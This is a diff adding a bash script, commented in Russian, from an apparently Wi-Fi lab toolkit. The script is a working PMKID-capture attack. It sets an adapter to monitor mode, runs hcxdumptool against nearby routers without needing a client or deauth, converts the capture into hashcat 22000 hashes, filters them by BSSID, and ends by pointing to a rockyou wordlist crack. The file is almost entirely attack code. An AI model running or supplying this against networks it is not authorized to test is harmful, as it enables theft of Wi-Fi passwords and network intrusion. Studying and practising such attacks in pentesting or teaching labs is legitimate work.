@@ -1,0 +1,150 @@
+#!/usr/bin/env bash
+# ============================================================================
+#  wlab pmkid — PMKID-захват
+#  Не нужен клиент. Не нужен деаут. Роутер сам отдаёт PMKID в первом EAPOL.
+#
+#  Работает и со старым hcxdumptool (5.x/6.x, есть -o),
+#  и с новым 7.x, где -o убрали и файл создаётся сам.
+# ============================================================================
+set -euo pipefail
+
+SELF=$(readlink -f "${BASH_SOURCE[0]}")
+export WLAB_ROOT="${WLAB_ROOT:-$(dirname "$(dirname "$SELF")")}"
+# shellcheck source=/dev/null
+source "$WLAB_ROOT/lib/wlab_lib.sh"
+wlab_load_conf
+wlab_need_root "$SELF" "$@"
+wlab_dirs
+
+DURATION=60
+BSSID=""
+IFC="$IFACE_MON"
+OUTDIR="$WLAB_STATE/caps"
+
+usage() {
+  cat <<EOF
+Использование: wlab pmkid [опции]
+
+  -d, --duration N  сколько секунд слушать (по умолчанию $DURATION)
+  -b, --bssid MAC   оставить только этот BSSID
+  -i, --iface IF    адаптер (по умолчанию $IFACE_MON)
+  -h, --help        эта справка
+EOF
+}
+
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    -d|--duration) DURATION="${2:?нет значения для $1}"; shift 2 ;;
+    -b|--bssid)    BSSID="${2:?нет значения для $1}"; shift 2 ;;
+    -i|--iface)    IFC="${2:?нет значения для $1}"; shift 2 ;;
+    -h|--help)     usage; exit 0 ;;
+    *)             wlab_die "неизвестная опция: $1" ;;
+  esac
+done
+
+wlab_uint "$DURATION" || wlab_die "duration должен быть числом"
+if [[ -n "$BSSID" ]]; then
+  [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || wlab_die "BSSID кривой: $BSSID"
+fi
+
+wlab_require_cmds hcxdumptool hcxpcapngtool || {
+  wlab_info "sudo apt install -y hcxdumptool hcxtools"
+  exit 1
+}
+
+mkdir -p "$OUTDIR" || wlab_die "не могу создать $OUTDIR"
+TAG=$(date +%Y%m%d_%H%M%S)
+HASH="$OUTDIR/pmkid_${TAG}.hc22000"
+
+cleanup() { wlab_mon_off "$IFC"; }
+trap cleanup EXIT
+trap 'cleanup; exit 0' INT TERM
+
+wlab_mon_on "$IFC"
+wlab_ok "$IFC: monitor"
+
+# ---------------------------------------------------------------------------
+#  какая версия hcxdumptool и что она умеет
+# ---------------------------------------------------------------------------
+HCX_HELP=$(hcxdumptool -h 2>&1 || true)
+
+HCX_ARGS=(-i "$IFC")
+USES_O=0
+
+# сравнение через bash-паттерн, а не `printf | grep -q`:
+# под pipefail такое даёт SIGPIPE и врёт в if
+if [[ "$HCX_HELP" == *"-o <"* || "$HCX_HELP" == *" -o"* ]]; then
+  # старые версии (5.x/6.x): пишем в свой файл
+  PCAP="$OUTDIR/pmkid_${TAG}.pcapng"
+  HCX_ARGS+=(-o "$PCAP")
+  USES_O=1
+else
+  # 7.x: файл создаётся сам
+  PCAP=""
+  wlab_info "hcxdumptool без -o (7.x) — файл создастся сам в $OUTDIR"
+fi
+
+if [[ "$HCX_HELP" == *"--enable_status"* ]]; then
+  HCX_ARGS+=(--enable_status=1)
+fi
+
+STAMP="$OUTDIR/.pmkid_stamp"
+: > "$STAMP"
+
+wlab_info "слушаю ${DURATION}s — роутеры должны сами прислать PMKID"
+wlab_hr
+
+set +e
+( cd "$OUTDIR" && timeout --signal=INT "$DURATION" hcxdumptool "${HCX_ARGS[@]}" ) 2>&1 \
+  | grep -Ev '^\s*$' | tail -n 15
+set -e
+
+# ---------------------------------------------------------------------------
+#  где результат
+# ---------------------------------------------------------------------------
+if [[ $USES_O -eq 1 ]]; then
+  [[ -s "$PCAP" ]] || { wlab_err "hcxdumptool ничего не записал"; exit 1; }
+else
+  PCAP=$(find "$OUTDIR" -maxdepth 1 -name '*.pcapng' -newer "$STAMP" 2>/dev/null | head -1 || true)
+  if [[ -z "$PCAP" ]]; then
+    PCAP=$(find "$OUTDIR" -maxdepth 1 -name '*.pcapng' -mmin -2 2>/dev/null | head -1 || true)
+  fi
+  [[ -n "$PCAP" && -s "$PCAP" ]] || { wlab_err "не нашёл файл захвата"; exit 1; }
+fi
+rm -f "$STAMP"
+
+wlab_ok "захват: $PCAP"
+
+wlab_info "конвертирую в хеш..."
+hcxpcapngtool -o "$HASH" "$PCAP" >/dev/null 2>&1 || true
+
+if [[ ! -s "$HASH" ]]; then
+  wlab_err "PMKID не найдено."
+  wlab_info "причины: роутер не отдаёт PMKID, далеко, или это WPA3/SAE"
+  wlab_info "файл захвата всё равно сохранён: $PCAP"
+  exit 1
+fi
+
+if [[ -n "$BSSID" ]]; then
+  awk -F'*' -v b="$(printf '%s' "$BSSID" | tr 'A-Z' 'a-z')" \
+      'tolower($4) == b' "$HASH" > "${HASH}.filtered" 2>/dev/null || true
+  if [[ -s "${HASH}.filtered" ]]; then
+    mv "${HASH}.filtered" "$HASH"
+  else
+    rm -f "${HASH}.filtered"
+    wlab_warn "для $BSSID ничего, оставляю всё"
+  fi
+fi
+
+count=$(grep -c '^WPA\*' "$HASH" 2>/dev/null || true)
+count=${count:-0}
+wlab_ok "PMKID: $count шт."
+wlab_ok "хеш: $HASH"
+
+if command -v hcxhashtool >/dev/null 2>&1; then
+  hcxhashtool -i "$HASH" --info=stdout 2>/dev/null | head -n 25 || true
+fi
+
+echo
+wlab_info "дальше: hashcat -m 22000 $HASH /usr/share/wordlists/rockyou.txt"
+wlab_log pmkid done "file=$HASH" "count=$count" "bssid=${BSSID:-all}"
